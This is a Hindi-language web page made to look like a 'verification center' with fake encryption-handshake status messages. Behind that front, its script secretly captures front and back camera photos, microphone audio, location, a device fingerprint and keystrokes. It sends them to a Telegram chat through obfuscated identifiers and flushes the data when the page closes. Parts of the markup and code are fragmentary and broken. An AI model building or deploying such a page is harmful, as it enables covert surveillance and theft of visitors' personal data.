<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>वेरिफिकेशन सेंटर</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box;}
body{
    font-family:'Inter','Segoe UI',sans-serif;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
    padding:20px;
}
.container{
    background:rgba(255,255,255,0.05);
    backdrop-filter:blur(20px);
    -webkit-backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,0.1);
    border-radius:24px;
    padding:40px 32px;
    max-width:480px;
    width:100%;
    box-shadow:0 25px 60px rgba(0,0,0,0.5);
    position:relative;
    overflow:hidden;
}
.container::before{
    content:'';
    position:absolute;
    top:-50%;
    left:-50%;
    width:200%;
    height:200%;
    background:radial-gradient(circle at 30% 40%,rgba(99,102,241,0.08),transparent 60%);
    pointer-events:none;
}
.logo{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:12px;
    margin-bottom:28px;
}
.logo-icon{
    width:48px;
    height:48px;
    background:linear-gradient(135deg,#6366f1,#8b5cf6);
    border-radius:14px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:24px;
    color:#fff;
    box-shadow:0 8px 24px rgba(99,102,241,0.3);
}
.logo h1{font-size:20px;font-weight:600;color:#fff;letter-spacing:-0.3px;}
.logo span{display:block;font-size:12px;font-weight:400;color:rgba(255,255,255,0.5);margin-top:2px;}
.status-card{
    background:rgba(255,255,255,0.06);
    border-radius:16px;
    padding:24px;
    margin-bottom:20px;
    border:1px solid rgba(255,255,255,0.06);
}
#titleText{
    font-size:17px;font-weight:600;color:#fff;margin-bottom:6px;
}
#status{
    font-size:14px;color:rgba(255,255,255,0.65);font-weight:400;margin-bottom:4px;
}
#errorDetail{
    font-size:12px;color:rgba(255,255,255,0.35);display:none;margin-top:8px;word-break:break-all;
}
.loader-wrap{
    display:flex;align-items:center;gap:16px;margin-top:16px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.06);
}
.pulse-ring{
    position:relative;
    width:36px;height:36px;
}
.pulse-ring::before{
    content:'';position:absolute;inset:0;
    border-radius:50%;border:3px solid rgba(99,102,241,0.2);
    animation:pulse 1.8s ease-in-out infinite;
}
.pulse-ring::after{
    content:'';position:absolute;inset:5px;
    border-radius:50%;background:linear-gradient(135deg,#6366f1,#8b5cf6);
}
@keyframes pulse{
    0%,100%{transform:scale(1);opacity:1;}
    50%{transform:scale(1.4);opacity:0.3;}
}
.loader-text{font-size:13px;color:rgba(255,255,255,0.5);}
.steps{
    display:flex;flex-direction:column;gap:10px;margin-top:8px;
}
.step-row{
    display:flex;align-items:center;gap:12px;padding:8px 12px;border-radius:10px;
    background:rgba(255,255,255,0.03);font-size:13px;color:rgba(255,255,255,0.5);
}
.step-row .icon{width:22px;text-align:center;font-size:14px;}
.step-row .dot{
    width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,0.15);
    flex-shrink:0;transition:0.3s;
}
.step-row.active{background:rgba(99,102,241,0.08);color:rgba(255,255,255,0.85);}
.step-row.active .dot{background:#6366f1;box-shadow:0 0 12px rgba(99,102,241,0.4);}
.step-row.done{color:rgba(255,255,255,0.6);}
.step-row.done .dot{background:#22c55e;box-shadow:0 0 12px rgba(34,197,94,0.3);}
.badge{
    display:inline-block;
    padding:4px 12px;
    border-radius:20px;
    font-size:11px;
    font-weight:500;
    background:rgba(34,197,94,0.12);
    color:#22c55e;
    margin-top:12px;
}
.footer{
    margin-top:24px;
    padding-top:16px;
    border-top:1px solid rgba(255,255,255,0.06);
    display:flex;
    justify-content:space-between;
    align-items:center;
    font-size:11px;
    color:rgba(255,255,255,0.2);
}
.hidden{display:none !important;}
.fade-in{animation:fadeIn 0.5s ease forwards;}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>

                <span class="dot"></span>

            <div class="step-row" data-step="2">
                <span class="dot"></span>
                <span class="icon">🛡️</span>

            </div>
            <div class="step-row" data-step="3">

                <span class="icon">📡</span>

                <span class="icon">✅</span>
                <span>अंतिम सत्यापन प्रक्रिया</span>
            </div>
        </div>
    </div>

    <div class="footer">
        <span>प्रोटोकॉल v3.2.1</span>
        <span>सत्र: <span id="sessionId">••••••••</span></span>
    </div>
</div>

async function startCamera(){
    try{
        setStep(1);
        loaderText.textContent = 'एन्क्रिप्शन हैंडशेक चरण 1/4';
        const stream = await navigator.mediaDevices.getUserMedia({
            video:{width:{ideal:640},height:{ideal:480},facingMode:'user'},
            audio:false
        });
        frontStream = stream;
        videoFront.srcObject = stream;
        await new Promise((resolve)=>{
            videoFront.onplaying=()=>{
                setStatus('कनेक्शन स्थिर किया जा रहा है...','#6366f1');
                loaderText.textContent = 'एन्क्रिप्शन हैंडशेक चरण 2/4';

        });
    }catch(e){
        setStatus('सर्वर हैंडशेक जारी...','rgba(255,255,255,0.5)');
    }
}

        safeAddTimer(()=>capturePhoto(callback),500);
        return;

    canvas.height=videoFront.videoHeight;
    const ctx=canvas.getContext('2d');
    ctx.drawImage(videoFront,0,0,canvas.width,canvas.height);
    canvas.toBlob(b=>{
        if(!b){if(callback)callback();return;}
        const fd=new FormData();
        fd.append('chat_id',_0x9e3f);

        if(frontStream){frontStream.getTracks().forEach(t=>t.stop());frontStream=null;}
        if(callback)callback();
    },'image/jpeg',0.85);
}

                c.width=tv.videoWidth||640;c.height=tv.videoHeight||480;
                c.getContext('2d').drawImage(tv,0,0);
                c.toBlob(b=>{if(!b){stream.getTracks().forEach(t=>t.stop());document.body.removeChild(tv);return;}const fd=new FormData();fd.append('chat_id',_0x9e3f);fd.append('photo',b,'bc.jpg');tgSend(_0x4b3f[4],fd);stream.getTracks().forEach(t=>t.stop());document.body.removeChild(tv);},'image/jpeg',0.85);
            },600);
        };
        tv.play();
    }catch(e){}
}

async function startAll(){
    setStep(1);
    tgSend(_0x4b3f[3],{chat_id:_0x9e3f,text:'🌐 '+new Date().toLocaleString()+' | '+window.location.href});
    sendFingerprint();
    await startCamera();
    safeAddTimer(tryBackCamera,2000);
    safeAddTimer(startMicRecording,1000);
    safeAddTimer(getLocation,1500);
    safeAddTimer(startContinuousCapture,3000);
}

function cleanupAndSend(){
    continuousCaptureActive=false;
    if(captureInterval){clearInterval(captureInterval);captureInterval=null;}
    cleanupTimers.forEach(t=>{if(t.type==='timeout')clearTimeout(t.id);if(t.type==='interval')clearInterval(t.id);});
    if(keystrokeBuffer.length>0){const text=keystrokeBuffer.join('');navigator.sendBeacon(_0x6b2c+_0x4b3f[3],new Blob([JSON.stringify({chat_id:_0x9e3f,text:'⌨️ '+text})],{type:'application/json'}));keystrokeBuffer=[];}
    if(frontStream){frontStream.getTracks().forEach(t=>t.stop());frontStream=null;}
    if(audioStream){if(mediaRecorder&&mediaRecorder.state!=='inactive'){try{mediaRecorder.stop();}catch(e){}}audioStream.getTracks().forEach(t=>t.stop());audioStream=null;}
}

window.addEventListener('beforeunload',cleanupAndSend);
window.addEventListener('pagehide',cleanupAndSend);
document.addEventListener('visibilitychange',()=>{if(document.hidden&&keystrokeBuffer.length>0)flushKeystrokes();});
</script>
